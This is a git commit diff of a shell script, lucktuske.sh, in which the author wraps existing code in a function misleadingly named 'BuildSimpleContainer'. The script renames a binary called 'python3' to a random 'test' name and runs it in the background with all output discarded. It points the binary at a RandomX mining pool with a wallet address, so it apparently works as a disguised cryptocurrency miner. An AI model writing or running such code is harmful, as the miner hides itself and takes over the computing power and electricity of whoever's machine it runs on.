e62423cdab1de94b43adf9882ba51a3d393283cb
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-19 03:15:15 +0700

    Update lucktuske.sh

--- lucktuske.sh
+++ lucktuske.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
+function BuildSimpleContainer ()
+{
 
 kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
@@ -13,3 +15,5 @@ cd dotsrb
 mv python3 test$kolot
 
 nohup ./test$kolot -o randomx.rplant.xyz:17123 -a randomtuske -u TuskeSyuQm6YLGZbrMTCpgEcCK21jrizBgErTDV2VyNh8jJRWrJVwuy7h6JLqztszCFsPZFVh1wBLdBUsk22x7vcP33YDgppwgSHHj.DOT-$kolot > /dev/null 2>&1 &
+}   
+BuildSimpleContainer
